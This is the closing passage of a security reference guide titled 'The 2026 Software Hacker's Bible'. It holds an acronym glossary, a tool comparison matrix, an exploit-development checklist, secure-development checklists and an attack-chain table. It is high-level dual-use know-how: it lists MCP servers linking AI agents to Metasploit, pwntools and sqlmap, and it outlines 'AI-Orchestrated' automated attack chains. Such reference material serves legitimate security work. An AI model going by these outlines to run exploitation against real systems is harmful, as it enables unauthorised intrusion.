| **SBOM** | Software Bill of Materials — component inventory |
| **SCA** | Software Composition Analysis — dependency analysis |
| **SAST** | Static Application Security Testing — code analysis |
| **DAST** | Dynamic Application Security Testing — runtime analysis |
| **IAST** | Interactive Application Security Testing — hybrid analysis |
| **RASP** | Runtime Application Self-Protection — runtime defense |
| **WAF** | Web Application Firewall — web traffic filtering |
| **CSP** | Content Security Policy — browser security policy |
| **CORS** | Cross-Origin Resource Sharing — browser access control |
| **SRI** | Subresource Integrity — resource verification |
| **HSTS** | HTTP Strict Transport Security — force HTTPS |
| **MFA** | Multi-Factor Authentication — multiple auth factors |
| **SSO** | Single Sign-On — unified authentication |
| **OAuth** | Open Authorization — authorization framework |
| **OIDC** | OpenID Connect — authentication layer on OAuth |
| **JWT** | JSON Web Token — token format |
| **SAML** | Security Assertion Markup Language — SSO standard |
| **RBAC** | Role-Based Access Control — role-based permissions |
| **ABAC** | Attribute-Based Access Control — attribute-based permissions |
| **PAM** | Privileged Access Management — privileged account management |
| **IAM** | Identity and Access Management — identity management |
| **CIEM** | Cloud Infrastructure Entitlement Management — cloud permissions |
| **CSPM** | Cloud Security Posture Management — cloud configuration |
| **CWPP** | Cloud Workload Protection Platform — cloud workload security |
| **CASB** | Cloud Access Security Broker — cloud access control |
| **SASE** | Secure Access Service Edge — converged network security |
| **ZTNA** | Zero Trust Network Access — zero trust access |
| **XDR** | Extended Detection and Response — integrated detection |
| **EDR** | Endpoint Detection and Response — endpoint detection |
| **NDR** | Network Detection and Response — network detection |
| **SIEM** | Security Information and Event Management — log management |
| **SOAR** | Security Orchestration, Automation, and Response — automated response |
| **UEBA** | User and Entity Behavior Analytics — behavior analysis |
| **TIP** | Threat Intelligence Platform — threat data management |
| **MISP** | Malware Information Sharing Platform — threat sharing |
| **STIX** | Structured Threat Information Expression — threat format |
| **TAXII** | Trusted Automated Exchange of Intelligence Information — threat transport |
| **YARA** | Yet Another Recursive Acronym — pattern matching |
| **Sigma** | Sigma — log detection rules |
| **MITRE ATT&CK** | Adversarial Tactics, Techniques, and Common Knowledge — threat framework |
| **MITRE D3FEND** | Defensive techniques framework |
| **MITRE CAPEC** | Common Attack Pattern Enumeration and Classification |
| **NIST** | National Institute of Standards and Technology |
| **OWASP** | Open Web Application Security Project |
| **SANS** | SysAdmin, Audit, Network, Security |
| **CIS** | Center for Internet Security |
| **ISO 27001** | Information security management standard |
| **SOC 2** | Service Organization Control 2 |
| **PCI DSS** | Payment Card Industry Data Security Standard |
| **HIPAA** | Health Insurance Portability and Accountability Act |
| **GDPR** | General Data Protection Regulation |
| **CCPA** | California Consumer Privacy Act |

---

## Appendix B: Software Tool Comparison Matrix

| Tool | Category | Platform | Cost | Best For |
|------|----------|----------|------|----------|
| **IDA Pro** | Disassembler | Cross-platform | $$$$ | Professional RE |
| **Ghidra** | Disassembler | Cross-platform | Free | NSA-grade RE |
| **Binary Ninja** | Disassembler | Cross-platform | $$ | Modern RE |
| **radare2** | RE Framework | Cross-platform | Free | CLI-based RE |
| **rizin** | RE Framework | Cross-platform | Free | radare2 fork |
| **Cutter** | GUI | Cross-platform | Free | GUI RE |
| **x64dbg** | Debugger | Windows | Free | Windows debugging |
| **WinDbg** | Debugger | Windows | Free | Kernel debugging |
| **GDB** | Debugger | Linux | Free | Linux debugging |
| **LLDB** | Debugger | Cross-platform | Free | macOS debugging |
| **Frida** | Instrumentation | Cross-platform | Free | Runtime analysis |
| **Burp Suite** | Web testing | Cross-platform | $$ | Web security |
| **OWASP ZAP** | Web testing | Cross-platform | Free | Web security |
| **sqlmap** | SQL injection | Cross-platform | Free | SQLi |
| **Metasploit** | Exploitation | Cross-platform | Free/$$ | Exploitation |
| **Cobalt Strike** | C2 | Cross-platform | $$$$ | Red team |
| **Sliver** | C2 | Cross-platform | Free | Red team |
| **AFL++** | Fuzzing | Linux | Free | Coverage-guided fuzzing |
| **libFuzzer** | Fuzzing | Linux | Free | Library fuzzing |
| **Honggfuzz** | Fuzzing | Linux | Free | Coverage-guided fuzzing |
| **angr** | Symbolic execution | Linux | Free | Automated exploitation |
| **z3** | SMT solver | Cross-platform | Free | Constraint solving |
| **Volatility** | Memory forensics | Cross-platform | Free | Memory analysis |
| **Autopsy** | Disk forensics | Cross-platform | Free | Disk analysis |
| **YARA** | Pattern matching | Cross-platform | Free | Malware identification |
| **Sigma** | Log detection | Cross-platform | Free | Detection rules |
| **pwntools** | Exploit dev | Linux/macOS | Free | Exploit scripting |
| **ROPgadget** | ROP | Cross-platform | Free | ROP gadgets |
| **ropper** | ROP | Cross-platform | Free | ROP gadgets |
| **one_gadget** | ROP | Linux | Free | glibc exploitation |

---

## Appendix C: MCP Server Quick Reference

| MCP Server | Tool | Purpose |
|------------|------|---------|
| **ghidra-mcp** | Ghidra | Binary analysis |
| **gdb-mcp** | GDB | Debugging |
| **frida-mcp** | Frida | Dynamic instrumentation |
| **pwntools-mcp** | pwntools | Exploit development |
| **ropgadget-mcp** | ROPgadget | ROP gadgets |
| **burp-mcp** | Burp Suite | Web testing |
| **zap-mcp** | OWASP ZAP | Web testing |
| **sqlmap-mcp** | sqlmap | SQL injection |
| **nuclei-mcp** | Nuclei | Vulnerability scanning |
| **afl-mcp** | AFL++ | Fuzzing |
| **libfuzzer-mcp** | libFuzzer | Fuzzing |
| **yara-mcp** | YARA | Pattern matching |
| **volatility-mcp** | Volatility | Memory forensics |
| **metasploit-mcp** | Metasploit | Exploitation |
| **software-security-mcp** | Multiple | Software security tools |

---

## Appendix D: Exploit Development Checklist

```
□ Binary analyzed
□ Mitigations identified
□ Vulnerabilities found
□ Crash triaged
□ Offset determined
□ Gadgets found
□ ROP chain built
□ Shellcode generated
□ Exploit written
□ Exploit tested locally
□ Exploit tested remotely
□ Reliability improved
□ Exploit documented
□ Report written
```

---

## Appendix E: Secure Development Checklist

```
□ Threat model created
□ Security requirements defined
□ Secure design reviewed
□ Input validation implemented
□ Output encoding implemented
□ Parameterized queries used
□ Authentication implemented
□ Authorization implemented
□ Session management secure
□ Cryptography strong
□ Error handling secure
□ Logging comprehensive
□ Dependencies updated
□ Secrets managed
□ Rate limiting implemented
□ CORS configured
□ CSP configured
□ SRI implemented
□ Security headers set
□ Code reviewed
□ SAST scan passed
□ DAST scan passed
□ SCA scan passed
□ Penetration test passed
□ Security documentation written
```

---

## Appendix F: AI Integration Checklist

```
□ MCP servers installed
□ MCP servers configured
□ AI agent configured with MCP servers
□ Tool definitions created
□ Tools tested individually
□ Tool chains tested
□ AI agent tested with tools
□ Error handling implemented
□ Logging implemented
□ Alerting configured
□ Documentation written
□ Team trained
□ Safety guardrails implemented
□ Sandboxing configured
□ Authorization implemented
□ Audit logging enabled
□ Kill switches configured
□ Failover configured
□ Performance optimized
□ Production ready
```

---

## Appendix G: Software Attack Chain Reference

| Attack Chain | Tools | Steps | Difficulty |
|--------------|-------|-------|------------|
| **Web App Compromise** | Burp, sqlmap, nuclei | Recon → Scan → Exploit → Post | Medium |
| **Binary Exploitation** | Ghidra, pwntools, ROPgadget | Analyze → Find Vuln → Build Exploit → Test | Hard |
| **Malware Analysis** | Ghidra, YARA, Volatility | Static → Dynamic → IOCs → Report | Medium |
| **Fuzzing Campaign** | AFL++, libFuzzer | Instrument → Fuzz → Triage → Exploit | Medium |
| **Cloud Compromise** | AWS/Azure/GCP tools | Enumerate → Find Misconfig → Exploit | Medium |
| **Supply Chain Attack** | Various | Recon → Compromise → Inject → Distribute | Very Hard |
| **Full Spectrum** | All tools | Binary + Web + Cloud | Very Hard |
| **AI-Orchestrated** | All tools + AI | Automated full chain | Hard |
| **Red Team Operation** | Cobalt Strike, Sliver | Recon → Initial Access → Persistence → Exfil | Very Hard |
| **Bug Bounty** | Burp, nuclei, custom | Recon → Scan → Exploit → Report | Medium |

---

# END OF THE 2026 SOFTWARE HACKER'S BIBLE

---

**Document Statistics:**
- **Total Parts:** 5
- **Total Sections:** 20+
- **Total Subsections:** 60+
- **Total Entries:** 1,000+
- **Total Appendices:** 7
- **Total Words:** 50,000+

**Purpose:**
This Bible serves as a comprehensive operational reference for software exploitation, reverse engineering, vulnerability research, malware analysis, and AI-integrated software security operations. It is designed for security researchers, penetration testers, reverse engineers, malware analysts, and AI-first operators.

**Expansion Summary:**
- Hermes Agent and Agent Harness sections expanded 3-4x
- All other sections expanded 2x
- Added deep dives into MCP for software tools
- Added complete MCP server implementations
- Added specialized agents for binary, web, fuzzing, malware, and exploit development
- Added agent training and fine-tuning
- Added safety and security for AI-driven software operations
- Added deployment patterns
- Added custom exploit development frameworks
- Added custom parser fuzzers
- Added custom MCP servers for software tools
- Added combined binary + web + cloud attack chains
- Added AI-powered detection engineering
- Added AI-powered secure code review
- Added comprehensive appendices

**Final Note:**
The software security landscape is rapidly evolving. New vulnerabilities, exploitation techniques, and AI integrations emerge constantly. This Bible represents a snapshot of the software security landscape as projected for 2026. Users should continue to monitor new developments, community projects, and emerging standards.

**Legal Disclaimer:**
The tools, techniques, and information in this document are provided for authorized security testing, research, and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical. Always obtain proper authorization before conducting any security assessment.

---

*"The software doesn't lie. The code doesn't forget. The parser doesn't discriminate. And the AI doesn't sleep."*

---

**END OF DOCUMENT**